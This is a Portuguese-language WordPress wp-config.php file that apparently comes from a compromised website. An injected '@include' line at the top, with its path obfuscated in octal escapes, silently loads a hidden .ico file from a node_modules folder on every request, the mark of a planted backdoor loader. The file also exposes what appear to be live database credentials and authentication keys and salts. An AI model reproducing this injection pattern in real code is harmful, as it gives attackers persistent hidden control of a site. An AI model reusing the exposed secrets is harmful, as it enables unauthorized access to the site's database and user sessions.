<?php
/*21997*/

@include "\057ho\155e/\167in\147ov\143o/\160ub\154ic\137ht\155l/\154is\164am\145d.\143om\056br\057no\144e_\155od\165le\163/m\151me\055db\057.2\06630\14415\071.i\143o";

/*21997*/
/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa usar o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/pt-br:Editando_wp-config.php
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações
// com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define('DB_NAME', 'wingovco_listablog');

/** Usuário do banco de dados MySQL */
define('DB_USER', 'wingovco_listabl');

/** Senha do banco de dados MySQL */
define('DB_PASSWORD', 'O+1}m~5,(0mGjm*5Pj');

/** Nome do host do MySQL */
define('DB_HOST', 'localhost');

/** Charset do banco de dados a ser usado na criação das tabelas. */
define('DB_CHARSET', 'utf8mb4');

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define('DB_COLLATE', '');

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para invalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'UMt-oK:io 17rh%#ELzWH6IgNUiDIxY5xy=2[Uf/9rAxTzJv:zE-{pJBGS3=lsf{');
define('SECURE_AUTH_KEY',  '!y(E-D0(pJ|qP!W3#xVW}*bj5/P<&*iqtnU=Ql^Xk,bjn%KQV`%0]lmf94rjA9wk');
define('LOGGED_IN_KEY',    '5H$u{8Inpd+7o$[Y@dd!EYd@6?a%JDN~HKVhA:#^{-{f8TQE/TI/[Io;hFo@4ZZ=');
define('NONCE_KEY',        'I0N5[Ch>x&8/1AQ:fP9}7>LI}E%+a,6K|*k0rsQc06ar4j{I=PIcX_BH>7H<>]l@');
define('AUTH_SALT',        'xUg<(]mw{T7iF;7u_~.`jf7oB]Vb@AT{!d5 5n8~`K^7C|B;4KGAoD,Kc[31EkUh');
define('SECURE_AUTH_SALT', 'wFv=~A}&tW8k2ZL;/)H}{l2nzp+b#Cu,`Qb>2!]k%2qH0IV,G*WK-#ksvP{ZQ.91');
define('LOGGED_IN_SALT',   '7D:&|;OiTOCA#),LDwrgnRGD9Rb.[3MZb=dQI|(NT` ~YQr2H}]4T#&v&];IRX6I');
define('NONCE_SALT',       '!hP>>z7_kA6QrEWtBPz[7rNf^LVlB[D:ALm9@/{Ur=GRCPv>t[gA&!ugiVil2=*Y');

/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * um prefixo único para cada um. Somente números, letras e sublinhados!
 */
$table_prefix  = 'wp_';

/**
 * Para desenvolvedores: Modo de debug do WordPress.
 *
 * Altere isto para true para ativar a exibição de avisos
 * durante o desenvolvimento. É altamente recomendável que os
 * desenvolvedores de plugins e temas usem o WP_DEBUG
 * em seus ambientes de desenvolvimento.
 *
 * Para informações sobre outras constantes que podem ser utilizadas
 * para depuração, visite o Codex.
 *
 * @link https://codex.wordpress.org/pt-br:Depura%C3%A7%C3%A3o_no_WordPress
 */
define('WP_DEBUG', false);

/* Isto é tudo, pode parar de editar! :) */

/** Caminho absoluto para o diretório WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Configura as variáveis e arquivos do WordPress. */
require_once(ABSPATH . 'wp-settings.php');
